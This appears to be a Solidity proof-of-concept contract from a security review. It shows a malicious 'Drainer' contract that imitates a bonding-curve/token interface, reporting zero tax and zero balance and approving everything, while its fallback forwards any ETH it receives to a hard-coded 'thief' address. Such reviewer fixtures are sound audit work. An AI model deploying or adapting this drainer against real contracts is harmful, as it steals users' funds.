// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
/// Reviewer PoC: a "curve"+"token" an operator key (or wrong address resolution) could point snipe() at.
contract Drainer {
    address public immutable thief;
    constructor(address t) { thief = t; }
    function currentSnipeTaxBps(address) external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    fallback() external payable { payable(thief).transfer(msg.value); }
}
